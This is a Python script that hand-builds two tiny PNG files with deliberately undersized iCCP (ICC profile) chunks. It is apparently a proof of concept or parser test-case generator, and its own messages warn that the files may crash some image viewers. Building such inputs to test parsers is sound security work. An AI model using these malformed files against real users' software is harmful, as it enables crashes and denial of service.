import struct
import zlib

def create_chunk(chunk_type: bytes, data: bytes) -> bytes:
    """Create a PNG chunk with proper length and CRC."""
    length = struct.pack(">I", len(data))
    crc = struct.pack(">I", zlib.crc32(chunk_type + data) & 0xffffffff)
    return length + chunk_type + data + crc

def create_malformed_icc_png(output_filename="malformed_iccp.png"):
    """
    Creates a PNG with a malformed iCCP chunk containing an ICC profile
    that is less than 4 bytes, which can trigger issues in some PNG parsers.
    """
    with open(output_filename, "wb") as f:
        # PNG signature
        f.write(b"\x89PNG\r\n\x1a\n")
        
        # IHDR chunk: width=1, height=1, bit depth=8, color type=2 (RGB)
        ihdr_data = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
        f.write(create_chunk(b'IHDR', ihdr_data))
        
        # Malformed iCCP chunk:
        # Keyword: "ICC" + null byte
        # Compression method: 0 (zlib/deflate)
        # The profile data should be compressed according to PNG spec
        # We'll use a tiny 3-byte profile, compress it with zlib, which will still be malformed
        # libpng expects a larger valid ICC profile structure
        iccp_keyword = b"ICC\x00"
        iccp_compression = b"\x00"
        raw_profile = b"\xDE\xAD\xBE"  # Only 3 bytes - malformed!
        compressed_profile = zlib.compress(raw_profile)
        iccp_data = iccp_keyword + iccp_compression + compressed_profile
        f.write(create_chunk(b'iCCP', iccp_data))
        
        # IDAT chunk: minimal 1x1 red pixel
        raw_pixel = b"\x00\xff\x00\x00"  # No filter + RGB (red pixel)
        compressed_pixel = zlib.compress(raw_pixel)
        f.write(create_chunk(b'IDAT', compressed_pixel))
        
        # IEND chunk
        f.write(create_chunk(b'IEND', b''))
        
    print(f"Created malformed PNG at {output_filename}")
    print("Warning: This PNG has a malformed iCCP chunk that may crash some image viewers")

# Variation that creates a PNG with a 1-byte ICC profile
def create_extremely_malformed_icc_png(output_filename="extremely_malformed_iccp.png"):
    """Creates a PNG with an even more malformed iCCP chunk (1-byte ICC profile)"""
    with open(output_filename, "wb") as f:
        # PNG signature
        f.write(b"\x89PNG\r\n\x1a\n")
        
        # IHDR chunk: width=1, height=1, bit depth=8, color type=2 (RGB)
        ihdr_data = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
        f.write(create_chunk(b'IHDR', ihdr_data))
        
        # Extremely malformed iCCP chunk with only 1 byte profile
        iccp_keyword = b"ICC\x00"
        iccp_compression = b"\x00"
        raw_profile = b"\xFF"  # Just 1 byte!
        compressed_profile = zlib.compress(raw_profile)
        iccp_data = iccp_keyword + iccp_compression + compressed_profile
        f.write(create_chunk(b'iCCP', iccp_data))
        
        # IDAT chunk: minimal 1x1 red pixel
        raw_pixel = b"\x00\xff\x00\x00"  # No filter + RGB (red pixel)
        compressed_pixel = zlib.compress(raw_pixel)
        f.write(create_chunk(b'IDAT', compressed_pixel))
        
        # IEND chunk
        f.write(create_chunk(b'IEND', b''))
        
    print(f"Created extremely malformed PNG at {output_filename}")

# Run the code to create both variations
if __name__ == "__main__":
    create_malformed_icc_png()
    create_extremely_malformed_icc_png()